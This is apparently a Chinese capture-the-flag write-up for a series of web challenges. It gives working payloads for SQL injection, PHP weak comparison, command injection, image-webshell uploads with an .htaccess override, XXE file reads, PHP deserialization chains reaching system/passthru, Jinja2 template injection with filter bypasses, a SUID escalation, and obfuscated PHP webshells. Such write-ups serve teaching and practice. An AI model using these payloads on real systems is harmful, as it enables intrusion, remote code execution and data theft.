cFxgDJMFgpCIuoEdwDChkoBVfDkaihdmPQZTwGcyNiSHpXLZfrszPoroaFSFoyZVysuPgwQpEQWQYqwLmfSCktrnuAUktVGnDvspNePKtABerKUsrjhJZnBtEsiRwoGDYVoSxzhDbLWysDJUWECVbNDtZEPLawlSblaIPtIfLJxpaJQnXQgVKIuWDZLmAlWfzxGmxEjtpLBmJCsvCyMemqylTnRXgqCzhfROrdtdPcrHtntoGyKnqjigbEfkdykWKlwQruRiDIVequOEJbHXdQCMIQAMTDXLQTgcLqmQlStExIAKMlNSXuhnUgYwTlVrqpadpTAzvLsTcopFOraXmxqCGqDiZhyUcWdraLNaxYlDTdjVkjHaWLVNDKvrDotXPOdLwPKGHiTpWzghIyopFBMJPEjaQlNJhZHctpMgvUawLrLnyuTxCejCavTOgQBwDFOdIZeawkGNWmwUzFauLxsqimLVSnEWPZYRAKHwHIWjCrPjtXTCeaCkVlrjRzhEvlwmnmrjlPqioroJpZDvJXtpOtHmsQheWgUnuDqjLUjWSzgdmuHBiNGsexkrxWqjIWCesrmJFgsLALwDKaONSCnKGTYvSHqsCdEnJmKbItitgTOlSigmioFqtEyaUKpqtYhWUBrtsLcfmfqojPScvTayNOmiJvAfczBUCUqdZexCqfBjsufdVdlKQWSVLfCnBydqAmVdhAnlSfrOTAIrgVXueYGjoJIByCoEJRtomAUqrTIcvnIdMoMjXkTEUjEwtEWorwefkTGalPEPnCJRjZJPHOWMPswlApIuNblsAXKXEnoxsaIwvhyOkHyMiYiFoCjXfgwlpiETVoUDfVqFpXclvKnwinPNHDRhnQwJZjATsqslVLeSMwSCIJTnatMuxMcAWrJdnwjWxYKHmJHOyEceCfwsmalGwVtJNXLpikQdhMYDYKFCxGrtSNaceCVuiEvQyBFycgCSwvAVjulXqbreazYTZPRhZdYqsvNKQfRpqITJXYZEizdNUCSRlNUKSGIrgLzBRdWfSzEObyJyCDlspgNPukmbIDwloSGWPXUbnoZPaZISqjkGlRihGcOtHmkwFBrhGIxutiLOZLfIvLpkQpcKcJvcYSoMXqiNYgrGvfTHFmKCwgdIGNmWPcwyfJhIphUJYjAMgFPzPMoWjElspZCbXDkQzihAwSlxNztzMbaUxEXhAizBxopqZMYazFBXQtBXSncriVJTgLbZrNfGFjctMTEmObPLpENwnovQHnBnPqYhFkqVkdqRoNoveCdoTGmgzlRJatIpByQGpjelGEmTGHELfxsIruzldvLMihnPzhLrfKMgCVOSOvDUrYhiuxnlVNgtilbQwoWbyMciXOQsfegmznLtaMzunRDscsnQCvZcwjtLWkuvidyjSGOSWGIRGzGyWcqjyJiWejPzIdfzLGaCSvNqhwEqAvCxcGVspJnyMgiXHOfetWgMeWGmoXHsXIucVwEvHaDWbidGZaTMzYTrKQPwbDbcRnUDymaMhuTYPlWqdNsTngReMqSvwDeBIjkIfDTnJwNvaUMdCrSiJYxbYAHgyTIvThjptWEDlhEBuIvrgkiRpsVpTruBKuJAZRHFBTBAxqKjyZVtscfYoJAwrvmpWCYxWAcvOjOGWuvphnjoTcpcyopaHPSYNSFpLhdsVqusxufxbwZjzwhGHjsCkvWUDHioXebCGemDKSutHqiOCImIhsvMcgfSvMcuvAdEhuRbDHqeVFzIMwUTjZrBNzfwcenAucPrjhOKOFXNKnwRBdiucOjdraiEGfDChPLiYkEnifjEoIDjRSDuNBDMRDxtCDLscfXtRCNZxWfYeKCpzYBiSrMoIpUbRklzEVwQVehVpkFyVrVtujiSPOLEFOVhCrDWChnroYGOLFwItVbxfZlzjkgOvdAEdTjLebjyKHSEYvMduWainHlZHbtIADMtmXOjyaVsasBDemSCOuLaFeAMatFmqPYgoPBuwgfhxpMngLGthLNaDRySnrXiuXGdsXebrmUvdueGmUSmhIuXJOVGpOhqwtzIcuirDThNsyLdExgVmHqUptlwLJVQwSlZOuVTHrbfRhuibwpkJwJkDPUGwGLyZorkRskRTqaeHlClCjQyOPZTmNzpDHxndJVsxAnpLuqHNktLHrGaPKTeDlhKWtxUltveFDgBERTnKHaSHdaZDKPxlKWmvGnQCLZJgSaVRplUSjaXjseKhXlMxdvTYJNsOgislKzLnepaxWECaTCflPMuJzOCMdBgCribrHLGlpBqTkTEcVHgoGQWUjVTUzjyPUhWbiBRxckxGThXqexUSgFmtfdYtKhTWtfjxoPiMYVBqERcWxoRkQSkULJiPhCSfXoUykfGSimlmHBHzWbsagTJdgYoKFuAjXCqKvnukUclWZVANxeRvCXUqojAgEaByFkNKxLgKObKgsHRijRzxQVaUprskCmATLwvgiDyIndpeaSiPljfSAhRtLwEtJBODxjtyMzIomksXUGbskQjSPdgwxJWaejgnfxwJrdHgMCrSrwBTuGfcojXVLWNClYvzJTyDXrLzkSqxbcLHdvcFMnwGMwLERmcmDUQuIvUdjIcJKXULTyPchlWLxVpuihKemfgFJfGApvzAnjShbxKUqAtBDPtpIgEKdyidUqNJocWbnPEbMxCZhRUjTrVteNiFDVmNaMBNetaWEtafXncKfEXYptvijKGuiZXgmoFBTHBriRIcDBdZJIaymIuZkNuZKWmpTLhScjTiJrKJDXvZeGVNJTDINafpQwiPkqbIvgqCTwkCWhZrgQIHuBkBgwOnOTCEHRxpaGbMJrsgLEOInhVKIwhIhgVjtqArCYijwoMhnsOqziDfnIZEfDaUOhSVyqhWKZIJsJfNWIStPqbyFmZPlnLYwbSoEkxwRSTfznbOGYrSjCSRlPEytycnVXAesjgQsMjuetJvdGSjxoNwufCPvxMUqDPKeQTsXQcIRQGoqCUDbZlHbYkFqJhruVmRiWGpDiPSKXOsBHvPvJNgaSOSHrNUiOwvBUgzWrTcBWAKrkBMobfONCzmXbRHganRgFJZsgvwTmkLiXfkyqcYjSWHKoSoyWOgoFGhXPturGEUCuIVBczaLnxzUkmwFbKAkcXuzaiByLNEaugBXnkXtuAqDKuMtMxGCKQHPIWtwkXoEXaCzqVnlmTueyDsKmQuqOBPekMIfdiSbHDVFbhbaUVPIFPchCuZxFBRaKceldvAWvgIkroVrHpvIEiHqBIYxGyueUVTWPoDZRnrAStGFHwYczxVuPKXEUHFpHDjHcDZTmWhBmfTJvRSLUYhieMwGCDevGSfMBPzEOGiwsGbgmUfXYmnraIfPRxPuvkOrDVrAqfTOrvcXhUSHYJPbhqOUAFepOuGwEuoKcOtrpbZKOFCziyUpAXzSWXDidtDCFnlIqaCfzWNogViWoPhSnZYESkYRoiaoaETPhnswIXoGhbRpmWkFkOvPmoWexFEGntpePDBePblefuMvqBAtehBAzYdOstJLrymkahWgKhftLgmHZpBNeGmKcZafkLkRMIAWkqWYdxPYQkQewixKynMQMrqCiMwSZjELaWecgsqphcanAFEZycECYiSBoajuMlZdlYQtPejrvtYRsugRbVlFaWDbGAsVOAyERmNDPswIlDoyhZuWqonEVztwxyrmcyVmvCYkjZjwmzhTfnDSLIzgbxgAXLGptfGhVnXpktjfCzbLNtojTmpUekDrsIPYPXPsQroMOwMLvTnUnqnmzqASbduRJeGNAmgKvprEHOyGTFJWbafwEdxphKzOviNwfPrBuGwCYZhOVwirGHQDRtsfPCVgEmpsdAJEXBzfnRYiaqJRyfOFGadaJSXhfhsKfiCbakLbfENXFXdhpyADSNbDmQWUpbPMtCkxsRGJoaKcLgeKmzqSoHaLoSuAWZqvIMfCiEfyCmGPadaHumUlFWrntbTNqukENBzEFObGrNTXNbKBhXCupKDIJNykATKfBQvzSYgQELWUfepXnBFncFqCHCTxCLMfPUpaUkRtoJMbpadzmyHfQEHpGatSqZohDJBxMajbXdRFsHTpXzTDgYRnpfzVPEFsknYZaXdNezYIZTeczgOZTlYhylchNEHivrFhihcxYNIcDGixscIDYkbEYuloZqdmFLNaFDUGcgMQvlYwJSdsPgvuseuOAYiaFOnkCrJgWnRCJuHGZEyLJEuEDedwphNLMrpdvgRVENLRpcMaqwgOwrVOjcjgSahSTAOxiYlQpsbApqtqYQrOpczjaTnvxhUclzYJuqpLalVRmLZlieUNefYNLwJNJZhoUxtOxLDTQXJlswXMprgjwOPDPGiVNtQxzshImKZNvZtXIRiMsIhqjyIBurirPcwVaTbKqiTFtzbzHkjPIBYeKTSNrmNHnZgdrxAkJmOyKZWPIsQvxFSriYRSkABozQclJizGaKitcrfWowxpNKmzCsqwTbocXjKfujNSRKWUyUWqrhXtgLSXgItLZtorjiKPzinOxdvPGvYZyPLfvlAMIqUgSCmhNExifbfwPlriPnYVljZvzWEqXdiTYDzjhYgoiYJZfpqhrkLdcxkMIXDFBnFEVXlvHtaloYiNTPYRvDgwfWmwKRspCelMYAghSUjskGmnjDJWIMYMYPEaoqiYEZnCyzEIprFumcLiVPKjObkUpdirdoDzBLGvikaEmXjTMpEdxmsAqdfwOrqrSwxBWXdfbuAtEdPYZRqnTaopFjvplSHOntxIFjnjvnmlUtofmyRegkaelImWYDHJpbfyDEHbGFeHRZngNyKOsarinDhJZTrdNxltQOnwoKrkHsTKofRymjVSNdeRFvrlRVclbFUJlNbiENwOeAMeTCuBoJFZMrgtegqcRKQdaFpwhcUFOZsfMTkviehQFCAvZborgWjSYhWQzHAsKmEgwfWmJYvHTPuSKOmOyFjgkvHIuPIbralqLBDQiDutlcUxmcXdSYgemREgfLVQNcNerMnuCkqnrYzisxzOxnBfCJQfGTvxbvnPHRzImrOGNvjCYWnGQrBotaUgZcHjfHBqsUrgYQspgqTjsxUvrmdpLebKgSivumvjIkoqwCeBpJwbHvOpkWQwVREFOyFaeDzPelPykaxDumJRzGMQlvqDhFySqDzTRxpWLESyWDrcBIBHxESudenUdquFVwTjITmaqngtgRjhSLdtXcNPFVkgWyHEofdAvLsFlmKlHZQxZWCXqtyndzRHfwZxjtGcLjcRNxazLDqtMqRabYxyCUKxNcaFkAJMiJaqGLQthPIYvQeusnmGJuVTEtkPzKoTYDERTHrIwhSxDubOapIcYQLZrpJiJhiKrLVjQKubkrwDJSwAtmnrCXUFYZWLGlyZBYigmUtpTzyLFRYEWlOjSEDqmQktdvUFVSuHZwNRXWmfUjMOwpHmSwXnXzUyUkEYMWVUePdEsvPEUeWnkXJcfaOubzFhLQbvMSolejybMvLuJYbkxgZQLAMyRfOAPjsCobsovaWawNcmRHfmCNlkRWbZEhGXQMrlWAreWJtlISGlxdJHNmzQhuFuYLIdkdYRaYJWpFbZHbNvcmGukGSyKoLwVANVJrkXJGoVJWnIrIniacQVsvUEsUioPnoYhyCUsegXOsRcvcHxZfpmRkJUxyjYaZvFrnmIFAmzindESEskJVJmCnGhehMhLCoAMbCENszFLXchIwUizywEFxEJsizGlCrEWmhLWmpbFeOrbEhEgFkpelexDQkHXHlYjOANomnxlPZuByRZLDpdXLAZDZocOupMonVtIoBlaPUvMDpZvmKhNyPXZLEMWgjEBUPQBhZjvBNCSkuqMreXSCbudhGAmYiTEBlUDoRsZgTPVnlFaYIrvOPvbFkiCxbCDhlEmvpsjSgdEXtYgOxdVTPvXeftPzdsXUfhfQtPIEIcQnGYernWaFJyfDcDxNoHmfWzQGrGqnrhCPVmJavXBLChpGialPrUSTDHcMlJedpdFDKDZIHJPRMCmBaXkYFqSIFYpqJrlEBpzDGROVdkLWSZdzuRHwQJoPkVIvRUDpWXqVbzWLUPNSHEKwIvmojanGqGAUpODlgnWPOUjHpSGnKrOkDPAKAXtLGifiudqSKegAUCNbvBpaeJFHqyvAjdiyfTRpqCNlDVEISCZUfvnIFtxReYGwCXIhwcDbevHcDGQOLpzPHgcuojXiZdSoRYgoVmduqghYIYLmQWKvKCaZHtSNOMnHeQxskuQRebzDvRigACxBmCRagYpmtpb";

var input = document.getElementById('passwordInput');
var button = document.getElementById('unsealButton');

for (let i = 0; i < 500; i++) {
  input.value = password;
  button.click();
}
```

### 04 第四章 金曦破禁与七绝傀儡阵

第一关

get发送key=xdsec

第二关

post请求declaration=织云阁=第一

第三关

全部本地ip头一把梭

```Plain
X-Forwarded-For:127.0.0.1
Client-ip:127.0.0.1
X-Client-IP:127.0.0.1
X-Remote-IP:127.0.0.1
X-Rriginating-IP:127.0.0.1
X-Remote-addr:127.0.0.1
HTTP_CLIENT_IP:127.0.0.1
X-Real-IP:127.0.0.1
X-Originating-IP:127.0.0.1
via:127.0.0.1
```

第四关

```Plain
User-Agent:moe browser
```

第五关

```Plain
Cookie:user=xt
```

第六关

```Plain
Referer:http://panshi/entry
```

第七关

```Plain
PUT /void_rebirth HTTP/1.1
Host: 127.0.0.1:50724
Content-Length: 11


新生！
```

全部base64拼接在一起解密

### 06 第六章 藏经禁制？玄机初探！

万能密码

admin/admin' or '1'='1

### 07 第七章 灵蛛探穴与阴阳双生符

根据hint访问robots.txt

然后根据robots.txt访问flag.php

php弱比较

```Plain
/flag.php?a=QNKCDZO&b=240610708
```

### 09 第九章 星墟禁制·天机问路

应该是调用nslookup或者dig之类的命令，用;截断就能rce了

### 13 第十三章 通幽关·灵纹诡影

文件上传，检测jpg的文件头

```Plain
copy 1.jpg/b + 1.php/a 2.php
```

制作一个图片马，直接上传，没有后缀过滤，然后antsword连接

### 17 第十七章 星骸迷阵·神念重构

```Plain
<?php
class A{public $a;}
$o=new A();
$o->a="system('env');";
echo serialize($o);
?>
```

### 10 第十章 天机符阵_revenge

申请一个外部实体xxe，然后在<输出>或<解析>处引用，<阵枢>没有回显

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<root>
  <阵枢>test</阵枢>
  <解析>test</解析>
  <输出>&xxe;</输出>
</root>
```

### 14 第十四章 御神关·补天玉碑

文件上传，过滤了php等等后缀

可以先上传一个.htaccess

```Plain
<FilesMatch "\.jpg">
  SetHandler application/x-httpd-php
</FilesMatch>
```

然后上传后缀为jpg的webshell，通过.htaccess解析成php代码

这里没有文件头限制，随便怎么传都行

然后antsword连接

### 18 第十八章 万卷诡阁·功法连环

依旧是简单的pop链子

unserialize -> PersonA::__wakeup -> PersonB::work -> eval

```Bash
<?php
class PersonA {
    private $name;
    public function __construct($name) {
        $this->name = $name;
    }
}
class PersonB {
    public $name;
    public function __construct($name) {
        $this->name = $name;
    }
}
$code="phpinfo();";
$personB=new PersonB($code);
$personA=new PersonA($personB);
$serialized=serialize($personA);
print(urlencode($serialized));
?>
```

### 19 第十九章 星穹真相·补天归源

代码有点长，但是链子也比较简单

unserialize($_GET['person'])-》PersonA::__destruct()->PersonC::__Check()->system('cat /flag')

```Bash
<?php

class Person
{
    public $name;
    public $id;
    public $age;
    public function __invoke($id)
    {
    }
}
class PersonA extends Person
{
}
class PersonB extends Person
{
}
class PersonC extends Person
{
}
$c=new PersonC();
$c->name="system";
$c->age="safe_string";
$a=new PersonA();
$a->name=$c; 
$a->id="__Check";
$a->age="cat /f*";
$payload=serialize($a);
echo urlencode($payload);
?>
```

### 20 第二十章 幽冥血海·幻语心魔

先看看附件，非常简单的flask ssti

密码随便填，用户名会被render_template_string函数渲染到Jinja2模板

```Plain
{{lipsum.__globals__.__builtins__.__import__('os').popen('env').read()}}
```

### 摸金偶遇FLAG，拼尽全力难战胜

浏览器控制台执行

```JavaScript
fetch('/get_challenge?count=9')
  .then(r => r.json())
  .then(d => {
    console.log('answers:', d.numbers, 'token:', d.token);
    return fetch('/verify', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({answers: d.numbers, token: d.token})
    });
  })
  .then(r => r.json())
  .then(data => console.log('verify result:', data));
```


### 08 第八章 天衍真言，星图显圣


非常简单的sql注入，直接手注就出来了

用户名随便填

密码

```Plain
1' union all select value, null from user.flag -- -
```

### 11 第十一章 千机变·破妄之眼

根据hint生成一个爆破字典

```Python
import itertools
list = ['m', 'n', 'o', 'p', 'q']
zd = [''.join(perm) for perm in itertools.permutations(list)]
with open('1.txt', 'w') as f:
    for p in zd:
        f.write(f"{p}={p}\n")
```

用burp的intruder爆破一下就行了

结果是http://127.0.0.1:53420/?omnqp=omnqp

跳转到了/find.php

flag看不到

太大的文件无法读取，猜测可能是include之类的函数，于是考虑使用php伪协议filter过滤器来读取flag文件


### 19 第十九章_revenge

反序列化，system禁用的考虑无回显rce 命令执行结果写入本地

利用链: unserialize->PersonC::__wakeup->PersonB::__invoke->PersonA::__destruct->PersonC::check->exec('command')

```Bash
<?php
class Person{public $name,$id,$age;}
class PersonA extends Person{}
class PersonB extends Person{}
class PersonC extends Person{}
$c=new PersonC;$b=new PersonB;$a=new PersonA;
$c->name='passthru';$c->id=$b;$c->age='phantom';
$b->id=$a;$b->name='env>flag.txt';
$a->id='check';
echo urlencode(serialize($c));
```

### 21 第二十一章 往生漩涡·言灵死局

ssti,过滤了["__", "global", "{{", "}}"]

绕过方法比代码的字符串多

{{标签过滤了，用{%set代替

__和global用八进制绕过

```Python
{%set a='\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f'%}{%set b='\x5f\x5fgetitem\x5f\x5f'%}{%set c='os'%}{%set d='popen'%}{%set e='env'%}{%print lipsum|attr(a)|attr(b)(c)|attr(d)(e)|attr('read')()%}
```

### 22 第二十二章 血海核心·千年手段

无回显ssti，因为这是flask，可以直接创建一个static目录把命令执行结果写入这个目录，web端可以直接访问

username传入payload，password随便填

```Plain
/?username={{lipsum.__globals__.__builtins__.__import__('os').popen('mkdir static').read()}}&password=aaa
```

然后看看环境变量

```Plain
/?username={{lipsum.__globals__.__builtins__.__import__('os').popen('env>static/flag.txt').read()}}&password=aaa
```

flag不在环境变量中，当前权限是普通用户

查看根目录，flag权限是600，只有root用户能读

不出网flash无回显提权

先看看suid，发现/usr/bin/rev可用

/usr/bin/rev的作用是翻转字符串

执行命令/usr/bin/rev /flag>static/flag.txt

```Plain
{{lipsum.__globals__.__builtins__.__import__('os').popen('/usr/bin/rev /flag>static/flag.txt').read()}}
```

命令执行结果是空的,这里在网上找了各种/usr/bin/rev提权相关资料，然后又在自己本地尝试很多/usr/bin/rev提权方法，本地可以但是一到题目环境就不行，卡了几个小时

直到我ls /usr/bin/，发现了一个rev.c，这显然不是linux自带的东西，可能是出题人重新编译了一个rev

读取一下

```Plain
/?username={{lipsum.__globals__.__builtins__.__import__('os').popen('cat+/usr/bin/rev.c>static/flag.txt').read()}}&password=aaa
```

```C++
#include <unistd.h>
#include <string.h>

int main(int argc, char argv) {

    for(int i = 1; i + 1 < argc; i++) {
        if (strcmp("--HDdss", argv[i]) == 0) {
            execvp(argv[i + 1], &argv[i + 1]);
        }
    }

    return 0;
}
```

根据rev.c的代码，使用--HDdss参数执行命令（说实话感觉这题很脑洞了）

```Plain
/?username={{lipsum.__globals__.__builtins__.__import__('os').popen('/usr/bin/rev+--HDdss+cat+/flag>static/flag.txt').read()}}&password=aaa
```


### 这是...Webshell？

放出了字符_

可以通过php取反构造逃逸payload

```Bash
$_=~(%9E%8C%8C%9A%8D%8B);    //这里利用取反符号把它取回来，$_=assert
$__=~(%A0%AF%B0%AC%AB);      //$__=_POST
$___=$$__;                   //$___=$_POST
$_($___[_]);                 //assert($_POST[_]);
放到一排就是：
$_=~(%9E%8C%8C%9A%8D%8B);$__=~(%A0%AF%B0%AC%AB);$___=$$__;$_($___[_]);
```

### 这是...Webshell?_revenge

无法构造取反，服务端php版本是PHP/5.6.40

php5不支持这种表达方式

注意到php的$_FILES变量，在用户上传文件时，无论是否有这个功能，都会将文件接收，并且放在临时目录下

我们可以去将这个文件作为shell脚本执行，就可以逃逸出过滤进行rce

例如文件内容是ls 

那么`./ /tmp/php??????`的执行结果就会是ls的执行结果

因为无法使用字母，所以需要构造通配符

`./ /???/?????????`

但是这样会匹配到所有字符，可能就会匹配到其他文件

由于php生成临时文件名是随机的，所以最后一位可能是大写字母

因此可以通过glob通配符`[@-[]`来匹配大写字母

于是我们可以构造出命令

`. /???/????????[@-[]`

命令有了，接下来怎么在限制30字符的情况下执行命令呢

php中，执行命令最短的写法就是反引号

php中eval无法直接搭配反应号使用

但是可以在php标签中直接使用反引号

因此可以构造payload

`<=. /???/????????[@-[]>`

在前面使用?>来闭合，防止代码与短标签冲突报错

```Plain
?><?=. /???/????????[@-[];
```

Payload

```YAML
POST /?shell=?><?=`.%20/???/????????[@-[]`; HTTP/1.1
Host: 127.0.0.1:56064
User-Agent: python-requests/2.32.3
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 157
Content-Type: multipart/form-data; boundary=1fae174c78836e1220135f7fb70bc702

--1fae174c78836e1220135f7fb70bc702
Content-Disposition: form-data; name="file"; filename="1.txt"

#!/bin/sh

env
--1fae174c78836e1220135f7fb70bc702--
```

不行就多试几次

php的临时文件名是随机的，所以最后一个字符不一定都是大写
